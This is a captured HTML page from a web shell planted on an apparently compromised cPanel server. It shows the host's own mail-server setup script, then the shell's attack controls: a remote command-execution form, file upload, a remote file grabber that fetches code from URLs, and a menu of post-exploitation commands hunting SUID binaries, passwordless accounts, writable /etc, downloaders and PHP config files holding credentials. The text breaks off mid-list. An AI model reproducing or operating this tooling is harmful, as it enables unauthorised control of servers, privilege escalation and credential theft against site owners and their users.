p'}&nbsp;)&nbsp;{&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;pr<br>int&nbsp;&quot;\\nChksrvd&nbsp;monitorin<br>g&nbsp;is&nbsp;disabled\\n&quot;;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}&nbsp;<br>&nbsp;&nbsp;&nbsp;&nbsp;else&nbsp;{&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;print<br>&nbsp;&quot;\\nDisabling&nbsp;Chksrvd&nbsp;mo<br>nitoring\\n&quot;;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Cpa<br>nel::Chkservd::disable('<br>imap');&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Cpanel::<br>Chkservd::disable('pop')<br>;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;system('/scrip<br>ts/restartsrv_chksrvd');<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}&nbsp;}&nbsp;&nbsp;sub&nbsp;enable_non<br>e&nbsp;{&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;system(&nbsp;'touch',<br>&nbsp;'/etc/imapdisable'&nbsp;);&nbsp;&nbsp;<br>&nbsp;&nbsp;&nbsp;print&nbsp;&quot;\\nDisabling&nbsp;ma<br>il&nbsp;server&nbsp;updates\\n&quot;;&nbsp;&nbsp;&nbsp;<br>&nbsp;&nbsp;my&nbsp;$updateconf&nbsp;=&nbsp;Cpane<br>l::Update::loadupdatecon<br>fig();&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$updateconf-&gt;<br>{'COURIERUP'}&nbsp;=&nbsp;'never';<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$updateconf-&gt;{'DOVE<br>COTUP'}&nbsp;=&nbsp;'never';&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;C<br>panel::Update::saveupdat<br>econfig($updateconf);&nbsp;}&nbsp;<br>&nbsp;sub&nbsp;enable_dovecot&nbsp;{&nbsp;&nbsp;&nbsp;<br>&nbsp;&nbsp;print&nbsp;&quot;\\nChecking&nbsp;that<br>&nbsp;Dovecot&nbsp;is&nbsp;up&nbsp;to&nbsp;date\\n<br>&quot;;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;my&nbsp;$updateconf&nbsp;&nbsp;&nbsp;<br>&nbsp;&nbsp;&nbsp;=&nbsp;Cpanel::Update::loa<br>dupdateconfig();&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;my&nbsp;<br>%orig_updateconf&nbsp;=&nbsp;%{$up<br>dateconf};&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$updateco<br>nf-&gt;{'COURIERUP'}&nbsp;=&nbsp;'nev<br>er';&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$updateconf-&gt;{'<br>DOVECOTUP'}&nbsp;=&nbsp;'daily';&nbsp;&nbsp;<br>&nbsp;&nbsp;&nbsp;$updateconf-&gt;{'SYSUP'<br>}&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;=&nbsp;'daily';&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Cpa<br>nel::Update::saveupdatec<br>onfig($updateconf);&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<br>my&nbsp;@dovecotup&nbsp;=&nbsp;('/scrip<br>ts/dovecotup');&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;push<br>&nbsp;@dovecotup,&nbsp;'--force'&nbsp;i<br>f&nbsp;($force);&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;system(@<br>dovecotup);&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;unless&nbsp;<br>(&nbsp;$skip_maildir_conversi<br>on&nbsp;||&nbsp;(&nbsp;!$force&nbsp;&amp;&amp;&nbsp;$last<br>_active_mailserver&nbsp;eq&nbsp;'d<br>ovecot'&nbsp;)&nbsp;)&nbsp;{&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;pr<br>int&nbsp;&quot;\\nConverting&nbsp;user&nbsp;m<br>aildirs&nbsp;to&nbsp;Dovecot&nbsp;forma<br>t...\\n&quot;;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;system(<br>'/scripts/maildir_conver<br>ter&nbsp;--forreal&nbsp;--overwrit<br>e&nbsp;--to-dovecot');&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<br>&nbsp;&nbsp;$error_count++&nbsp;if&nbsp;($?)<br>;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;print&nbsp;&quot;\\nCh<br>ecking&nbsp;SSL&nbsp;cert...&quot;;&nbsp;&nbsp;&nbsp;&nbsp;<br>&nbsp;my&nbsp;$dovecot_cert_ref&nbsp;=&nbsp;<br>Cpanel::SSLCerts::fetchS<br>SLFiles(&nbsp;'service'&nbsp;=&gt;&nbsp;'d<br>ovecot'&nbsp;);&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;unless&nbsp;(&nbsp;<br>$dovecot_cert_ref-&gt;{'crt<br>'}&nbsp;)&nbsp;{&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;print&nbsp;&quot;mi<br>ssing\\n&quot;;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;print&nbsp;<br>&quot;Generating&nbsp;default&nbsp;cert<br>...&quot;;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;open&nbsp;OLDST<br>DERR,&nbsp;'&gt;&amp;STDERR';&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<br>&nbsp;&nbsp;open&nbsp;STDERR,&nbsp;'&gt;',&nbsp;'/de<br>v/null';&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Cpanel:<br>:SSLCerts::createDefault<br>SSLFiles(&nbsp;'service'&nbsp;=&gt;&nbsp;'<br>dovecot'&nbsp;);&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;open<br>&nbsp;STDERR,&nbsp;'&gt;&amp;OLDSTDERR';&nbsp;<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;print&nbsp;&quot;done\\n&quot;;&nbsp;<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;my&nbsp;$courier_cert<br>_ref&nbsp;=&nbsp;Cpanel::SSLCerts:<br>:fetchSSLFiles(&nbsp;'service<br>'&nbsp;=&gt;&nbsp;'courier-imapd'&nbsp;);&nbsp;<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;(&nbsp;$courier_c<br>ert_ref-&gt;{'crt'}&nbsp;)&nbsp;{&nbsp;&nbsp;&nbsp;&nbsp;<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;print&nbsp;&quot;Reusing&nbsp;<br>existing&nbsp;Courier-IMAP&nbsp;ce<br>rt...&quot;;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$cou<br>rier_cert_ref-&gt;{'service<br>'}&nbsp;=&nbsp;'dovecot';&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<br>&nbsp;&nbsp;&nbsp;&nbsp;$courier_cert_ref-&gt;{<br>'quiet'}&nbsp;&nbsp;&nbsp;=&nbsp;1;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<br>&nbsp;&nbsp;&nbsp;&nbsp;my&nbsp;@result&nbsp;=&nbsp;Cpanel:<br>:SSLCerts::installSSLFil<br>es(&nbsp;%{$courier_cert_ref}<br>&nbsp;);&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;print&nbsp;&quot;d<br>one\\n&quot;;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}&nbsp;<br>&nbsp;&nbsp;&nbsp;&nbsp;else&nbsp;{&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;print<br>&nbsp;&quot;done\\n&quot;;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;pr<br>int&nbsp;&quot;\\nChecking&nbsp;for&nbsp;expi<br>red&nbsp;SSL&nbsp;certs...&quot;;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;s<br>ystem&nbsp;'/usr/local/cpanel<br>/bin/checkallsslcerts';&nbsp;<br>&nbsp;&nbsp;&nbsp;&nbsp;print&nbsp;&quot;done\\n&quot;;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<br>&nbsp;print&nbsp;&quot;\\nEnabling&nbsp;Dovec<br>ot&nbsp;in&nbsp;init&nbsp;system\\n&quot;;&nbsp;&nbsp;&nbsp;<br>&nbsp;&nbsp;my&nbsp;$output&nbsp;=&nbsp;$init-&gt;ru<br>n_command_for_one(&nbsp;'enab<br>le',&nbsp;'dovecot'&nbsp;);&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;pr<br>int&nbsp;&quot;\\nStarting&nbsp;Dovecot\\<br>n&quot;;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$output&nbsp;=&nbsp;$init-<br>&gt;run_command(&nbsp;'dovecot',<br>&nbsp;'start'&nbsp;);&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;print&nbsp;&quot;\\<br>nEnabling&nbsp;Dovecot&nbsp;update<br>s\\n&quot;;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$orig_updateco<br>nf{'DOVECOTUP'}&nbsp;=&nbsp;'inher<br>it';&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$orig_updatecon<br>f{'COURIERUP'}&nbsp;=&nbsp;'never'<br>;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Cpanel::Update::sa<br>veupdateconfig(&nbsp;\\%orig_u<br>pdateconf&nbsp;);&nbsp;}&nbsp;&nbsp;sub&nbsp;enab<br>le_courier&nbsp;{&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;print&nbsp;&quot;<br>\\nChecking&nbsp;that&nbsp;Courier&nbsp;<br>is&nbsp;up&nbsp;to&nbsp;date\\n&quot;;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;my<br>&nbsp;$updateconf&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;=&nbsp;Cpan<br>el::Update::loadupdateco<br>nfig();&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;my&nbsp;%orig_upd<br>ateconf&nbsp;=&nbsp;%{$updateconf}<br>;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$updateconf-&gt;{'COU<br>RIERUP'}&nbsp;=&nbsp;'daily';&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<br>$updateconf-&gt;{'DOVECOTUP<br>'}&nbsp;=&nbsp;'never';&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$updat<br>econf-&gt;{'SYSUP'}&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;=&nbsp;'<br>daily';&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Cpanel::Upda<br>te::saveupdateconfig($up<br>dateconf);&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;my&nbsp;@couri<br>erup&nbsp;=&nbsp;('/scripts/courie<br>rup');&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;push&nbsp;@courier<br>up,&nbsp;'--force'&nbsp;if&nbsp;($force<br>);&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;system(@courierup<br>);&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;unless&nbsp;(&nbsp;$skip_m<br>aildir_conversion&nbsp;||&nbsp;(&nbsp;!<br>$force&nbsp;&amp;&amp;&nbsp;$last_active_m<br>ailserver&nbsp;eq&nbsp;'courier'&nbsp;)<br>&nbsp;)&nbsp;{&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;print&nbsp;&quot;\\nCo<br>nverting&nbsp;user&nbsp;maildirs&nbsp;t<br>o&nbsp;Courier&nbsp;format...\\n&quot;;&nbsp;<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;system('/scripts<br>/maildir_converter&nbsp;--for<br>real&nbsp;--overwrite&nbsp;--to-co<br>urier');&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$error_<br>count++&nbsp;if&nbsp;($?);&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}&nbsp;&nbsp;<br>&nbsp;&nbsp;&nbsp;if&nbsp;(&nbsp;$distro&nbsp;eq&nbsp;'free<br>bsd'&nbsp;)&nbsp;{&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;print&nbsp;&quot;<br>\\nEnabling&nbsp;courier-authd<br>aemond&nbsp;in&nbsp;init&nbsp;system\\n&quot;<br>;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;my&nbsp;$output&nbsp;=&nbsp;$<br>init-&gt;run_command_for_on<br>e(&nbsp;'enable',&nbsp;'courier-au<br>thdaemond'&nbsp;);&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#<br>&nbsp;Rebuilding&nbsp;the&nbsp;config&nbsp;f<br>ile&nbsp;on&nbsp;FreeBSD&nbsp;will&nbsp;upda<br>te&nbsp;the&nbsp;rc.conf&nbsp;settings&nbsp;<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;print&nbsp;&quot;\\nReconfi<br>guring&nbsp;other&nbsp;Courier&nbsp;ser<br>vices\\n&quot;;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;system<br>(&nbsp;'/scripts/courierup',&nbsp;<br>'--reconfig'&nbsp;);&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<br>&nbsp;print&nbsp;&quot;\\nRestarting&nbsp;Cou<br>rier\\n&quot;;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;system(<br>'/scripts/restartsrv_ima<br>p');&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;else&nbsp;{&nbsp;&nbsp;&nbsp;<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;foreach&nbsp;my&nbsp;$servic<br>e&nbsp;(qw(courier-authlib&nbsp;&nbsp;c<br>ourier-imap))&nbsp;{&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<br>&nbsp;&nbsp;&nbsp;&nbsp;print&nbsp;&quot;\\nEnabling&nbsp;$s<br>ervice&nbsp;in&nbsp;init&nbsp;system\\n&quot;<br>;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;my&nbsp;$output<br>&nbsp;=&nbsp;$init-&gt;run_command_fo<br>r_one(&nbsp;'enable',&nbsp;$servic<br>e&nbsp;);&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;print&nbsp;&quot;<br>\\nStarting&nbsp;$service\\n&quot;;&nbsp;<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$output&nbsp;=&nbsp;$i<br>nit-&gt;run_command(&nbsp;$servi<br>ce,&nbsp;'start'&nbsp;);&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;print&nbsp;&quot;\\nEnab<br>ling&nbsp;Courier&nbsp;updates\\n&quot;;<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$orig_updateconf{'C<br>OURIERUP'}&nbsp;=&nbsp;'inherit';&nbsp;<br>&nbsp;&nbsp;&nbsp;&nbsp;$orig_updateconf{'DO<br>VECOTUP'}&nbsp;=&nbsp;'never';&nbsp;&nbsp;&nbsp;&nbsp;<br>&nbsp;Cpanel::Update::saveupd<br>ateconfig($updateconf);&nbsp;<br>}&nbsp;&nbsp;#&nbsp;Both&nbsp;Dovecot&nbsp;and&nbsp;Co<br>urier&nbsp;are&nbsp;monitored&nbsp;by&nbsp;c<br>hksrvd&nbsp;using&nbsp;restartsrv_<br>imap&nbsp;sub&nbsp;enable_chksrvd_<br>monitoring&nbsp;{&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;my&nbsp;%mon<br>itored_services&nbsp;=&nbsp;Cpanel<br>::Chkservd::getmonitored<br>();&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;(&nbsp;$monitored_<br>services{'imap'}&nbsp;)&nbsp;{&nbsp;&nbsp;&nbsp;&nbsp;<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;print&nbsp;&quot;\\nChksrvd&nbsp;mo<br>nitoring&nbsp;is&nbsp;enabled\\n&quot;;&nbsp;<br>&nbsp;&nbsp;&nbsp;&nbsp;}&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;else&nbsp;{&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<br>&nbsp;print&nbsp;&quot;\\nEnabling&nbsp;chksr<br>vd&nbsp;monitoring\\n&quot;;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<br>&nbsp;&nbsp;Cpanel::Chkservd::enab<br>le('imap');&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;syst<br>em('/scripts/restartsrv_<br>chksrvd');&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}&nbsp;}&nbsp;&nbsp;sub&nbsp;<br>reconfigure_exim&nbsp;{&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;p<br>rint&nbsp;&quot;\\nReconfiguring&nbsp;EX<br>IM&nbsp;for&nbsp;new&nbsp;mailserver\\n&quot;<br>;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;my&nbsp;$output&nbsp;=&nbsp;Cpane<br>l::SafeRun::Errors::safe<br>runallerrors('/scripts/b<br>uildeximconf');&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;(<br>$?)&nbsp;{&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$error_cou<br>nt++;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;print&nbsp;$out<br>put;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;print&nbsp;&quot;\\nWA<br>RNING:&nbsp;EXIM&nbsp;will&nbsp;not&nbsp;be&nbsp;<br>restarted!\\n&quot;;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}&nbsp;&nbsp;&nbsp;&nbsp;<br>&nbsp;else&nbsp;{&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;print&nbsp;&quot;\\<br>nRestarting&nbsp;EXIM\\n&quot;;&nbsp;&nbsp;&nbsp;&nbsp;<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;system('/scripts/re<br>startsrv_exim');&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}&nbsp;}<br>&nbsp;&nbsp;sub&nbsp;usage&nbsp;{&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;print&nbsp;<br>&quot;Usage:&nbsp;setupmailserver&nbsp;<br>[options]&nbsp;&lt;mailserver&gt;\\n<br>\\n&quot;;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;print&nbsp;&quot;Options:<br>\\n&quot;;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;print&nbsp;&quot;&nbsp;&nbsp;--forc<br>e&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Per<br>form&nbsp;conversion&nbsp;even&nbsp;if&nbsp;<br>server&nbsp;is&nbsp;already&nbsp;config<br>ured\\n&quot;;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;print&nbsp;&quot;&nbsp;&nbsp;--<br>current&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<br>&nbsp;Display&nbsp;the&nbsp;currently&nbsp;c<br>onfigured&nbsp;mail&nbsp;server\\n&quot;<br>;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;print&nbsp;&quot;&nbsp;&nbsp;--skip-ma<br>ildir-conversion&nbsp;&nbsp;Don't&nbsp;<br>convert&nbsp;user&nbsp;maildirs&nbsp;du<br>ring&nbsp;the&nbsp;server&nbsp;conversi<br>on\\n&quot;;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;print&nbsp;&quot;\\n&quot;;&nbsp;&nbsp;<br>&nbsp;&nbsp;&nbsp;print&nbsp;&quot;MailServers:\\n<br>&quot;;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;print&nbsp;&quot;&nbsp;&nbsp;courier&nbsp;<br>&nbsp;&nbsp;&nbsp;Standard&nbsp;mail&nbsp;server&nbsp;<br>on&nbsp;cPanel&nbsp;systems\\n&quot;;&nbsp;&nbsp;&nbsp;<br>&nbsp;&nbsp;print&nbsp;&quot;&nbsp;&nbsp;dovecot&nbsp;&nbsp;&nbsp;&nbsp;Lo<br>wer&nbsp;memory&nbsp;usage&nbsp;mail&nbsp;se<br>rver\\n&quot;;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;print&nbsp;&quot;&nbsp;&nbsp;di<br>sabled&nbsp;&nbsp;&nbsp;Disable&nbsp;local&nbsp;P<br>OP3&nbsp;and&nbsp;IMAP&nbsp;functionali<br>ty\\n&quot;;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;print&nbsp;&quot;\\n&quot;;&nbsp;&nbsp;<br>&nbsp;&nbsp;&nbsp;&nbsp;exit&nbsp;0;&nbsp;}&nbsp;</td></tr></table><br><b>HEXDUMP:</b><nobr> [<a href=\"?act=f&f=setupmailserver&ft=info&fullhexdump=1&d=%2Fscripts%2F\">Full</a>] [<a href=\"?act=f&f=setupmailserver&ft=info&d=%2Fscripts%2F\">Preview</a>]<br><b>Base64: </b>\n<nobr>[<a href=\"?act=f&f=setupmailserver&ft=info&base64=1&d=%2Fscripts%2F\">Encode</a>]&nbsp;</nobr>\n<nobr>[<a href=\"?act=f&f=setupmailserver&ft=info&base64=2&d=%2Fscripts%2F\">+chunk</a>]&nbsp;</nobr>\n<nobr>[<a href=\"?act=f&f=setupmailserver&ft=info&base64=3&d=%2Fscripts%2F\">+chunk+quotes</a>]&nbsp;</nobr>\n<nobr>[<a href=\"?act=f&f=setupmailserver&ft=info&base64=4&d=%2Fscripts%2F\">Decode</a>]&nbsp;</nobr>\n<P>\n</td></tr></table><a bookmark=\"minipanel\"><br><TABLE style=\"BORDER-COLLAPSE: collapse\" cellSpacing=0 borderColorDark=#666666 cellPadding=5 height=\"1\" width=\"100%\" bgColor=#333333 borderColorLight=#c0c0c0 border=1>\n<tr><td width=\"100%\" height=\"1\" valign=\"top\"><center><form action=\"?\"><input type=hidden name=act value=\"cmd\"><br/><b>CMD:</b> <input type=hidden name=\"d\" value=\"/scripts/\"><input type=\"text\" name=\"cmd\" size=\"50\" value=\"\"><input type=hidden name=\"cmd_txt\" value=\"1\">&nbsp;<input type=submit name=submit value=\"Execute\"></form></td></tr></TABLE>\n<br>\n<TABLE style=\"BORDER-COLLAPSE: collapse\" cellSpacing=0 borderColorDark=#666666 cellPadding=5 height=\"1\" width=\"100%\" bgColor=#333333 borderColorLight=#c0c0c0 border=1>\n<tr>\n <td width=\"50%\" height=\"1\" valign=\"top\"><center><b>:: <a href=\"?act=search&d=%2Fscripts%2F\"><b>Search</b></a> ::</b><form method=\"POST\"><input type=hidden name=act value=\"search\"><input type=hidden name=\"d\" value=\"/scripts/\"><input type=\"text\" name=\"search_name\" size=\"29\" value=\"(.*)\">&nbsp;<input type=\"checkbox\" name=\"search_name_regexp\" value=\"1\"  checked> - regexp&nbsp;<input type=submit name=submit value=\"Search\"></form></center></p></td>\n <td width=\"50%\" height=\"1\" valign=\"top\"><center><b>:: <a href=\"?act=upload&d=%2Fscripts%2F\"><b>Upload</b></a> ::</b><form method=\"POST\" ENCTYPE=\"multipart/form-data\"><input type=hidden name=act value=\"upload\"><input type=\"file\" name=\"uploadfile\"><input type=hidden name=\"miniform\" value=\"1\">&nbsp;<input type=submit name=submit value=\"Upload\"><br><font color=red>[ Read-Only ]</font></form></center></td>\n</tr>\n</table>\n\n\n<br><TABLE style=\"BORDER-COLLAPSE: collapse\" cellSpacing=0 borderColorDark=#666666 cellPadding=5 height=\"1\" width=\"100%\" bgColor=#333333 borderColorLight=#c0c0c0 border=1><tr><td width=\"50%\" height=\"1\" valign=\"top\"><center><b>:: Remote File Grabber ::</b><br/><br/><form action=\"?grab=true\"   method=\"post\">File Url:<input name=\"from\"> New File Name: <input name=\"to\"> <input type=\"submit\" value=\"Grab!\"></center></td></tr></table>\n<br><TABLE style=\"BORDER-COLLAPSE: collapse\" cellSpacing=0 borderColorDark=#666666 cellPadding=5 height=\"1\" width=\"100%\" bgColor=#333333 borderColorLight=#c0c0c0 border=1><tr><td width=\"50%\" height=\"1\" valign=\"top\"><center><b>:: Make Dir ::<p><form action=\"?\"><input type=hidden name=act value=\"mkdir\"><input type=hidden name=\"d\" value=\"/scripts/\"><input type=\"text\" name=\"mkdir\" size=\"50\" value=\"/scripts/\">&nbsp;<input type=submit value=\"Create\"><br><font color=red>[ Read-Only ]</font></form></center></td><td width=\"50%\" height=\"1\" valign=\"top\"><center><b>:: Make File ::</b><form method=\"POST\"><input type=hidden name=act value=\"mkfile\"><input type=hidden name=\"d\" value=\"/scripts/\"><input type=\"text\" name=\"mkfile\" size=\"50\" value=\"/scripts/\"><input type=hidden name=\"ft\" value=\"edit\">&nbsp;<input type=submit value=\"Create\"><br><font color=red>[ Read-Only ]</font></form></center></td></tr></table>\n\n<br>\n<TABLE style=\"BORDER-COLLAPSE: collapse\" cellSpacing=0 borderColorDark=#666666 cellPadding=5 height=\"116\" width=\"100%\" bgColor=#333333 borderColorLight=#c0c0c0 border=1>\n<tr>\n  <td width=\"50%\" height=\"83\" valign=\"top\"><center>\n    <div align=\"center\"><br/><b>:: Useful Commands ::</b>\n    </div>\n    <form action=\"?\">\n      <div align=\"center\">\n        <input type=hidden name=act value=\"cmd\">\n        <input type=hidden name=\"d\" value=\"/scripts/\">\n <SELECT NAME=\"cmd\">\n           <OPTION VALUE=\"tar -cvf NEWTAR!!.tar -c /home/chsclair/public_html/td-admin/modules/gallery_management/images\n\">Tar your current directory. (Only works if your dir. is writable)\n           <OPTION VALUE=\"pwd\">List your current directory\n           <OPTION VALUE=\"ls -lia\">List you current directory's files, folders, & permissions\n           <OPTION VALUE=\"find / -type f -perm -04000 -ls\">find suid files\n           <OPTION VALUE=\"find . -type f -perm -04000 -ls\">find suid files in current dir\n           <OPTION VALUE=\"find / -type f -perm -02000 -ls\">find sgid files\n           <OPTION VALUE=\"find . -type f -perm -02000 -ls\">find sgid files in current dir\n           <OPTION VALUE=\"uname -a\">Kernel version\n           <OPTION VALUE=\"w\">Logged in users\n           <OPTION VALUE=\"lastlog\">Last users to connect\n           <OPTION VALUE=\"find /bin /usr/bin /usr/local/bin /sbin /usr/sbin /usr/local/sbin -perm -4000 2> /dev/null\">Suid bins\n           <OPTION VALUE=\"cut -d: -f1,2,3 /etc/passwd | grep ::\">Users without passwords\n                    <OPTION VALUE=\"find /etc/ -type f -perm -o+w 2> /dev/null\">Is /etc/ writable?\n                    <OPTION VALUE=\"which wget curl w3m lynx\">We got downloaders? :D\n                    <OPTION VALUE=\"cat /proc/version /proc/cpuinfo\">CpuInfo\n                    <OPTION VALUE=\"netstat -atup | grep IST\">Open ports\n                    <OPTION VALUE=\"locate gcc\">Is gcc installed?\n\t\t    <OPTION VALUE=\"find / -type f -name config.inc.php\">find 